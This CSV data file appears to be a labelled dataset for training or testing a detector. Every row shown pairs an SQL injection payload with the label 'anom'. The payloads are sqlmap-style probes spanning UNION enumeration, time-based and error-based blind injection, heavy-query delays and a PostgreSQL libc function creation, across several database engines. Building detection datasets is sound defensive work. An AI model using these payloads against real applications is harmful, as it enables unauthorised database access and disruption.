payload,label
"1""))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (((""uqyb""=""uqyb",anom
"1"") and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",anom
"1'||(select 'qdkb' where 4331=4331;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'",anom
"-3562"") as eghl where 7094=7094 union all select 7094,7094,7094,7094#",anom
"-5637%""))) or 6872=6872 and (((""%""=""",anom
"1"")) as jikg where 8258=8258 and (3973=1047)*1047--",anom
"1%');select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ('%'='",anom
"1%')) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (('%'='",anom
"1')) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (('bdsq' like 'bdsq",anom
1'));select case when 2930=7964 then 1 else null end--,anom
"1""));begin user_lock.sleep(5); end and ((""cxoi""=""cxoi",anom
"1')) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",anom
"1"" where 4808=4808 union all select null,null,null,null,null,null,null#",anom
"1') where 3579=3579 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",anom
"1 or 8466=benchmark(5000000,md5(0x694a4745))",anom
"-5230"") or elt(1032=1032,3623) and (""aivb"" like ""aivb",anom
"1%"" or 8514=benchmark(5000000,md5(0x544d5a4c))#",anom
"1'+(select thmg where 2546=2546 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",anom
"1"" where 8016=8016;select count(*) from generate_series(1,5000000)--",anom
1') as lgex where 4068=4068 and 1378=9247--,anom
"-3666""))) union all select 4136,4136,4136--",anom
"-5617) where 2132=2132 union all select 2132,2132,2132,2132#",anom
"-8893%') union all select 1254,1254--",anom
1 and 8594=(select 8594 from pg_sleep(5))--,anom
"-4379' union all select 1648,1648,1648,1648,1648,1648,1648#",anom
"1' where 3760=3760 union all select null,null,null,null,null,null,null,null#",anom
"1'))) union all select null,null,null,null,null,null#",anom
"1 and 8635=(select count(*) from generate_series(1,5000000))--",anom
"1));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((6977=6977",anom
"1"") or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""azpb""=""azpb",anom
"1' or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and 'ugum' like 'ugum",anom
"1)) as mgvw where 4923=4923 union all select null,null,null,null--",anom
"1"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",anom
"1'||(select 'bhxx' where 2585=2585;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",anom
"1) union all select null,null,null,null,null,null,null--",anom
"1"") as qnmd where 5642=5642;select (case when (9318=7198) then 9318 else 9318*(select 9318 from information_schema.character_sets) end)#",anom
"1"" and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",anom
-8447 where 2850=2850 or 7147=3262,anom
1' where 8770=8770 union all select null--,anom
"1))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",anom
"1 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",anom
"1') and elt(3528=3566,3566)",anom
"-5014"") or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""dkyp"" like ""dkyp",anom
"1') where 1363=1363;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",anom
1') or (select * from (select(sleep(5)))sddo)#,anom
"1%') union all select null,null,null,null--",anom
"1');select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ('ztmd'='ztmd",anom
1')));if(7899=7899) select 7899 else drop function zbbp--,anom
"1')) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (('beoh'='beoh",anom
"1')) and 8407=(select count(*) from generate_series(1,5000000)) and (('bzak' like 'bzak",anom
"1)));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((3044=3044",anom
"-2982' or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'iqwn'='iqwn",anom
"-4317"")) as nxvn where 2566=2566 union all select 2566,2566,2566#",anom
"1%"");select (case when (3855=3855) then 3855 else 1/(select 0) end)--",anom
1);begin user_lock.sleep(5); end--,anom
"-9944"")) or 8537=2039 and ((""kfzj""=""kfzj",anom
"1'+(select 'ewlk' where 1078=1078 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",anom
"1"" and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""endx""=""endx",anom
(7098=7098 and sleep(5)),anom
1' and 1541=6868#,anom
"1) where 8375=8375;select * from generate_series(6468,6468,case when (6468=7999) then 1 else 0 end) limit 1--",anom
1%';select (case when (3677=2193) then 3677 else 1/(select 0) end)--,anom
"1'));select benchmark(5000000,md5(0x4c4d6142)) and (('fegp'='fegp",anom
"-9565"" where 1616=1616 union all select 1616,1616,1616,1616--",anom
"-5411%"")) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""%""=""",anom
"1) as clye where 7842=7842 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",anom
-2569' union all select 4484--,anom
"1) as ahfj where 4776=4776 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",anom
"1%"")) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""%""=""",anom
-6548 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))-- rlda,anom
"1 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)-- ixlk",anom
"1%' union all select null,null,null,null,null,null#",anom
"-5032' or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",anom
"1%' and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and '%'='",anom
"1"")) as rpxd where 4929=4929;waitfor delay '0:0:5'--",anom
1'))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((('ywbs'='ywbs,anom
"-3781%') union all select 7497,7497,7497,7497,7497--",anom
1) rlike sleep(5),anom
"1';select count(*) from generate_series(1,5000000)--",anom
"1%""));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((""%""=""",anom
"1'||(select 'ussi' where 8958=8958;select benchmark(5000000,md5(0x4c4d6142)))||'",anom
"-8919"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""nstr""=""nstr",anom
"1 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)",anom
"1"") and 4595=4595#",anom
-4057') order by 1#,anom
"1"") and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""fpqh""=""fpqh",anom
"1') union all select null,null,null,null,null,null,null--",anom
-6327')) union all select 2685--,anom
"1"") as ymto where 3453=3453;select benchmark(5000000,md5(0x4c4d6142))--",anom
"1) or elt(5873=5873,sleep(5))#",anom
"1') and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('cssb'='cssb",anom
"1%""));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",anom
"1))) union all select null,null,null,null,null,null,null#",anom
"1%')));select count(*) from generate_series(1,5000000)--",anom
"1""""(.'.(,(.",anom
"1');select * from generate_series(3427,3427,case when (3427=7516) then 1 else 0 end) limit 1--",anom
"1"") where 4567=4567 or 8156=(select count(*) from generate_series(1,5000000))--",anom
-5820')) as lkik where 4044=4044 or 7156=9197--,anom
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'mvkg'='mvkg",anom
"1' where 4388=4388;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",anom
"1') as kqbh where 6138=6138;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",anom
"1');call regexp_substring(repeat(right(char(3702),0),500000000),null)",anom
"-7916')) union all select 9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",anom
"1"" and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""bzzt"" like ""bzzt",anom
"1%') and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",anom
"1 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))-- gkcl",anom
1');select (case when (7217=7631) then 7217 else 7217*(select 7217 from information_schema.character_sets) end)#,anom
"-5288') or make_set(1164=1710,1710) and ('pkwy'='pkwy",anom
"1"") where 6679=6679 rlike sleep(5)#",anom
"1"") and 8407=(select count(*) from generate_series(1,5000000)) and (""kssm""=""kssm",anom
"-1894') union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",anom
"1' where 9605=9605 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",anom
"1"")) and (1248=8705)*8705 and ((""wvma"" like ""wvma",anom
"1"") and (4085=4885)*4885 and (""sxte""=""sxte",anom
"1"" where 1982=1982;(select * from (select(sleep(5)))acdk)#",anom
"1 or elt(6272=6272,sleep(5))# klaw",anom
"1',(select (case when (5249=9648) then 1 else 1/(select 0) end))",anom
"1' in boolean mode) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))#",anom
1)) rlike (select * from (select(sleep(5)))vwyq)#,anom
"1') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('opll' like 'opll",anom
"1)) and 8407=(select count(*) from generate_series(1,5000000)) and ((4450=4450",anom
"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",anom
"1%'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('%'='",anom
"1%');select benchmark(5000000,md5(0x4c4d6142)) and ('%'='",anom
"-6906' where 1839=1839 union all select 1839,1839,1839,1839,1839--",anom
"1""))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""cwpt"" like ""cwpt",anom
"1"") where 2312=2312 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",anom
"1%"")) union all select null,null,null,null,null,null--",anom
-2797'))) union all select 5711#,anom
1') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('bmhw' like 'bmhw,anom
"1"" or 8156=(select count(*) from generate_series(1,5000000))--",anom
"1%""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((""%""=""",anom
1 and (3020=3020)*6703# syuj,anom
"1%""))) union all select null,null,null,null,null,null,null--",anom
"1'||(select 'ghby' from dual where 4854=4854;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",anom
"1"") or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""vkqt""=""vkqt",anom
"1%')) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",anom
1') and 8404=8651#,anom
1) as rqac where 3381=3381 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,anom
"-7008')) union all select 9080,9080,9080#",anom
"1 or elt(6272=6272,sleep(5))",anom
"1) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",anom
"1')) and 3824=benchmark(5000000,md5(0x76555642)) and (('obeh'='obeh",anom
1'+(select 'yahd' where 5850=5850;select sleep(5)#,anom
"1')) as cimd where 9608=9608;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",anom
1' and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'oofd'='oofd,anom
"1')) as peeo where 5356=5356 and elt(4722=2382,2382)--",anom
"1')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('aumk' like 'aumk",anom
"1' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)",anom
-2749') as fiho where 3531=3531 or 2777=1485#,anom
"-4826 union all select 4532,4532,4532,4532,4532--",anom
-1643' where 1968=1968 or 3484=6642,anom
"-4586') as shdb where 6176=6176 union all select 6176,6176,6176,6176#",anom
1) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (9932=9932,anom
"-6770')) union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",anom
-7041') where 6307=6307 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,anom
1' rlike (select * from (select(sleep(5)))sgvo) and 'mabd'='mabd,anom
-3559') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq'),anom
"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",anom
"1) where 6990=6990 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",anom
"1)) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((5776=5776",anom
1')) as jzoh where 6484=6484 and 7364=4233--,anom
"1'||(select 'eamo' where 4958=4958 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5))||'",anom
1)));begin dbms_lock.sleep(5); end and (((4675=4675,anom
"1'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (('wyvx'='wyvx",anom
"1"")) as ltco where 3862=3862 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",anom
1) where 4653=4653 or 6793=(select 6793 from pg_sleep(5))--,anom
"1"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((""mkal"" like ""mkal",anom
"1') and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('xonc'='xonc",anom
"1"" where 1386=1386;select (case when (3435=4011) then 1 else 3435*(select 3435 from master..sysdatabases) end)--",anom
"1')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('dkra' like 'dkra",anom
"1 or 8156=(select count(*) from generate_series(1,5000000))--",anom
"1) as dqda where 1624=1624 and 8635=(select count(*) from generate_series(1,5000000))--",anom
-8397'))) or 2171=4788,anom
"1""));select case when 1802=7063 then 1 else null end--",anom
"1"") or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""vudj"" like ""vudj",anom
"1)) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((8965=8965",anom
"1"")) as turj where 1237=1237;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",anom
"1'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('crus'='crus",anom
"1"" and 2388=benchmark(5000000,md5(0x6d457153))#",anom
"1' or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and 'esjl'='esjl",anom
"-7656""))) union all select 3172,3172,3172,3172,3172,3172,3172,3172,3172,3172--",anom
"1' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and 'sloy'='sloy",anom
"1') and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",anom
-7242' or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'kfff'='kfff,anom
"1') or 8466=benchmark(5000000,md5(0x694a4745)) and ('osov' like 'osov",anom
"1"" or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",anom
"1"")) union all select null,null,null,null,null,null#",anom
1'+(select 'rpds' where 5870=5870 and 4595=4595#,anom
"-4692%"")) union all select 1781,1781#",anom
"1' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))",anom
"1"")) as klie where 2840=2840 or 8514=benchmark(5000000,md5(0x544d5a4c))#",anom
"-4056""))) union all select 4363,4363,4363,4363,4363,4363,4363,4363#",anom
"1') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",anom
"1"" and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)",anom
-7951'))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('blak'='blak,anom
-7231)) union all select 7639#,anom
"1%"") union all select null#",anom
"1%"") union all select null,null,null,null,null,null,null,null,null#",anom
"1"" and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ""oyuj""=""oyuj",anom
"1' where 3362=3362;iif(5257=5257,1,1/0)",anom
"1""))) union all select null#",anom
"1' where 2202=2202 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",anom
"-6600') union all select 5566,5566#",anom
"-5145' where 2334=2334 union all select 2334,2334,2334,2334--",anom
1'+(select ggah where 3263=3263 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq'))+',anom
"1' and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and 'bxjo' like 'bxjo",anom
"1))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((4858=4858",anom
1') and 7533=7533 and ('dbjq'='dbjq,anom
"1 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)# mafe",anom
"1)) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((9313=9313",anom
"1))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((6578=6578",anom
1 where 7021=7021 or 6793=(select 6793 from pg_sleep(5))--,anom
"1)))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (((3950=3950",anom
"1') as idqc where 5288=5288 and elt(1210=1210,sleep(5))--",anom
"-5235) or make_set(9354=9354,7185)",anom
"1'))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((('zxrb'='zxrb",anom
"1' where 8869=8869 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",anom
1 and 7533=7533,anom
"1) and make_set(8403=8403,8899)",anom
"1%""))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((""%""=""",anom
1%'))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('%'=',anom
"1)) as zkrr where 4730=4730 or 8466=benchmark(5000000,md5(0x694a4745))--",anom
"1"" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)",anom
-6109 union all select 6784--,anom
"-5227"" union all select 2666--",anom
"1'+(select xwcl where 7997=7997;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",anom
"1) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",anom
"1) as zelk where 1944=1944 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",anom
"1%"")) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",anom
1))) or sleep(5) and (((2209=2209,anom
"1' in boolean mode);call regexp_substring(repeat(right(char(2385),0),500000000),null)--",anom
"1%"";waitfor delay '0:0:5' and ""%""=""",anom
"1%') or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",anom
"1"") or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (""igop""=""igop",anom
"1"" where 3274=3274 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",anom
"1"")));waitfor delay '0:0:5'--",anom
"1') union all select null,null,null,null#",anom
"-3230"")) as kbxc where 5007=5007 or 2107=8818",anom
1') waitfor delay '0:0:5' and ('fpnh'='fpnh,anom
"1%' union all select null,null,null,null,null,null,null,null,null--",anom
1%') and 6969=(select 6969 from pg_sleep(5)) and ('%'=',anom
"1'))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('hryb'='hryb",anom
"1'))) or 8156=(select count(*) from generate_series(1,5000000))--",anom
"1;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",anom
"1"") as hfgk where 1100=1100 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",anom
"1'+(select bptu where 7356=7356 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))))+'",anom
1' in boolean mode) union all select null--,anom
"1"" where 9829=9829 order by 1#",anom
"1') as elnu where 5719=5719 or 8156=(select count(*) from generate_series(1,5000000))--",anom
1) where 1402=1402;select sleep(5)#,anom
"1') as nmzp where 3794=3794 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",anom
"-1525'))) union all select 4110,4110,4110,4110,4110,4110#",anom
"1);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (3770=3770",anom
"1') where 7887=7887 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",anom
"1"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""mbas""=""mbas",anom
-1468'))) or 4875=6163#,anom
"-9572%"") or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""%""=""",anom
"-9451%"") union all select 9963,9963,9963--",anom
1') and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('svhx'='svhx,anom
"1"");begin user_lock.sleep(5); end--",anom
-8099%')) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'=',anom
"-1164"") union all select 6617,6617,6617,6617,6617,6617--",anom
1) order by 1--,anom
"1') where 6489=6489 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",anom
1 where 6827=6827;select case when 7717=7717 then 1 else null end--,anom
"1%""))) and (3502=7893)*7893 and (((""%""=""",anom
"1') and make_set(8403=8403,8899) and ('kyxl'='kyxl",anom
"-2979')) as klou where 7092=7092 union all select 7092,7092--",anom
"-8448%"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""%""=""",anom
"1"" union all select null--",anom
